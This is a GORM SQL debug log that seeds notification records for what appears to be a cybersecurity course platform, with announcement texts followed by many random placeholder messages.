2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.018ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.246','2025-06-09 14:07:56.246',NULL,'New machine ''SQL Injection Basics'' has been added to Web Security course','announcement','2025-06-09 14:07:56.246',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.477ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.685ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 1 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[10.302ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.257','2025-06-09 14:07:56.257',NULL,1,1) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.338ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.265','2025-06-09 14:07:56.265',NULL,'Reminder: Complete the ''Buffer Overflow'' challenge b','reminder','2025-06-09 14:07:56.265',true) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.544ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.695ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 2 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[16.844ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.274','2025-06-09 14:07:56.274',NULL,1,2) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.961ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.29','2025-06-09 14:07:56.29',NULL,'System maintenance scheduled for Saturday, May 25th from 2-4 AM UTC','system','2025-06-09 14:07:56.29',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.399ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.042ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 3 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.034ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.299','2025-06-09 14:07:56.299',NULL,1,3) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.943ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.307','2025-06-09 14:07:56.307',NULL,'Congratulations to the top 3 students on the leaderboard this month!','announcement','2025-06-09 14:07:56.307',true) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.456ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.540ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 4 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[10.436ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.314','2025-06-09 14:07:56.314',NULL,1,4) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.622ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.327','2025-06-09 14:07:56.327',NULL,'New course ''Advanced Network Security'' is now available','reminder','2025-06-09 14:07:56.327',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.718ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.713ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 5 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[10.768ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.338','2025-06-09 14:07:56.338',NULL,1,5) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.111ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.344','2025-06-09 14:07:56.344',NULL,'roaFIXLBitQPQrbNUuqh','system','2025-06-09 14:07:56.344',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.445ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.602ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 6 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.055ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.353','2025-06-09 14:07:56.353',NULL,1,6) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.955ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.363','2025-06-09 14:07:56.363',NULL,'HXzIviMFOGSgEyzEzqZp','system','2025-06-09 14:07:56.362',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.454ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.203ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 7 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[12.067ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.373','2025-06-09 14:07:56.373',NULL,1,7) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.043ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.381','2025-06-09 14:07:56.381',NULL,'rDNMmAcNqpqoxJDwUvmQ','system','2025-06-09 14:07:56.381',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.534ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.586ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 8 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.137ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.388','2025-06-09 14:07:56.388',NULL,1,8) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.745ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.394','2025-06-09 14:07:56.394',NULL,'oIzwrHytrHRifFruTxIF','system','2025-06-09 14:07:56.394',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.486ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.512ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 9 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.933ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.402','2025-06-09 14:07:56.402',NULL,1,9) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.864ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.408','2025-06-09 14:07:56.408',NULL,'pvtIWjnrEXKpCRXaQUtb','system','2025-06-09 14:07:56.408',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.429ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.457ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 10 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.856ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.418','2025-06-09 14:07:56.418',NULL,1,10) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.129ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.424','2025-06-09 14:07:56.424',NULL,'FrbbpKtEWXPwgSgGEbtf','system','2025-06-09 14:07:56.424',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.544ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.507ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 11 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.287ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.432','2025-06-09 14:07:56.432',NULL,1,11) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.484ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.44','2025-06-09 14:07:56.44',NULL,'WYHKdliaMfJmJKxJPydq','system','2025-06-09 14:07:56.44',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.098ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.536ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 12 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.315ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.448','2025-06-09 14:07:56.448',NULL,1,12) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.228ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.456','2025-06-09 14:07:56.456',NULL,'ThyqFYVKYDjfqUVxhrmv','system','2025-06-09 14:07:56.456',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.523ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.417ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 13 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.959ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.463','2025-06-09 14:07:56.463',NULL,1,13) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.829ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.474','2025-06-09 14:07:56.474',NULL,'rDhSDNulvyheEJLdSyXv','system','2025-06-09 14:07:56.474',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.469ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.452ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 14 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.163ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.482','2025-06-09 14:07:56.482',NULL,1,14) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.993ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.488','2025-06-09 14:07:56.488',NULL,'LmPzFKLNYcYAguFCWLwu','system','2025-06-09 14:07:56.488',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.462ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.391ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 15 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.925ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.495','2025-06-09 14:07:56.495',NULL,1,15) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.886ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.503','2025-06-09 14:07:56.503',NULL,'KBnMzNsxxbwzSUPMCFaH','system','2025-06-09 14:07:56.503',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.441ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.391ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 16 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.647ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.51','2025-06-09 14:07:56.51',NULL,1,16) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[12.191ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.518','2025-06-09 14:07:56.518',NULL,'LtkTSDDVhLuvfZXNvAYu','system','2025-06-09 14:07:56.518',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.702ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.463ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 17 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.682ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.532','2025-06-09 14:07:56.532',NULL,1,17) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.236ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.538','2025-06-09 14:07:56.538',NULL,'SqVdADnPltZcXuKAqZKx','system','2025-06-09 14:07:56.538',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.559ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.240ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 18 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[10.306ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.55','2025-06-09 14:07:56.55',NULL,1,18) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.894ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.556','2025-06-09 14:07:56.556',NULL,'YoqLGnqcOUouAsPHcljh','system','2025-06-09 14:07:56.556',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.466ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.437ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 19 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.065ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.563','2025-06-09 14:07:56.563',NULL,1,19) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.132ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.571','2025-06-09 14:07:56.571',NULL,'wdaNKnXMZydnGwbNmcXe','system','2025-06-09 14:07:56.571',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.533ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
